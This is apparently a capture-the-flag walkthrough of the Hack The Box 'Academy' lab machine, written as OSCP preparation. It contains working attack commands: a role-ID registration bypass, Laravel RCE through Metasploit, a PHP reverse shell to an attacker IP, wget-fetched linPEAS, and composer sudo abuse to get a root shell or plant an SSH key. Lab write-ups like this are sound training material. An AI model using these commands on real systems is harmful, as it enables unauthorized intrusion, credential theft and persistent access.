## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
---

## 🌐 Network Scanning

```bash
nmap -p- -T4 -A 10.10.10.215
```

Edit `/etc/hosts`:

```bash
vi /etc/hosts
# Add:
10.10.10.215 academy.htb
```

---

## 📁 Enumeration

### [HTTP](HTTP.md) (Port 80)

```bash
gobuster dir --url http://academy.htb/ -w /usr/share/wordlists/dirb/common.txt
```

- Discovered: `admin.php`
- Registered an account on the site
- Intercepted POST with Burp Suite and modified:

```http
POST /register
...
roleid=1
```

Access:

```http
http://academy.htb/admin.php
```

From the admin panel, discovered subdomain:

```bash
vi /etc/hosts
# Add:
10.10.10.215 academy.htb dev-staging-01.academy.htb
```

---

## 💥 Exploitation

### Laravel RCE (CVE-2018–15133)

Check Laravel version hint from `.env` at `dev-staging-01.academy.htb`:

```bash
# Manually visit:
http://dev-staging-01.academy.htb
```

Run Metasploit:

```bash
msfconsole
search laravel

use exploit/unix/http/laravel_token_unserialize_exec
set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
set RHOSTS 10.10.10.215
set VHOST dev-staging-01.academy.htb
set LHOST <your-tun0-IP>
run
```

Spawn TTY shell:

```bash
/usr/bin/php -r '$sock=fsockopen("10.10.16.9",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🧑‍💻 User: `cry0l1t3`

### Find .env file & Password

```bash
find / -type f -name .env 2>/dev/null
cat /var/www/html/academy/.env
# or
cat /var/www/html/htb-academy-dev-01/.env
```

Discovered credentials:

```plaintext
mySup3rP4s5w0rd!!
```

Login as `cry0l1t3` via SSH:

```bash
ssh cry0l1t3@10.10.10.215
id
cat user.txt
```

---

## 🧑 User: `mrb3n`

### Enumerate with linPEAS

On Kali:

```bash
cd ~/Downloads
python3 -m http.server 8000
```

On target:

```bash
cd /tmp
wget http://10.10.16.9:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Find credentials manually:

```bash
cd /var/log/audit
cat * | grep 'comm="su"'
# Extract the HEX from `data=` and decode to ASCII
```

Switch to user:

```bash
su mrb3n
# Password: mrb3n_Ac@d3my!
```

---

## 👑 Privilege Escalation to Root

### Sudo Check

```bash
sudo -l
```

Output:

```
(mrb3n) NOPASSWD: /usr/bin/composer
```

### GTFOBins: Composer to Root

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > $TF/composer.json
sudo composer --working-dir=$TF run-script x
```

Alternative (SSH Key Drop):

```bash
TF=$(mktemp -d)
echo '{"scripts":{"ssh":"echo 'ssh-ed25519 AAAA...yourkey... user@host' >> /root/.ssh/authorized_keys"}}' > $TF/composer.json
sudo composer --working-dir=$TF run-script ssh

# Then from Kali:
ssh -i ~/.ssh/id_rsa root@10.10.10.215
```

### Read Root Flag

```bash
cd /root
cat root.txt
```

---

## ✅ Summary

| Stage            | User         | Method                                             |
|------------------|--------------|----------------------------------------------------|
| Foothold         | `www-data`   | Laravel RCE + admin role bypass                    |
| User             | `cry0l1t3`   | `.env` file password reuse                         |
| Lateral Movement | `mrb3n`      | Audit log credential leak (linPEAS or manual grep) |
| Root             | `root`       | Composer abuse (GTFOBins)                          |
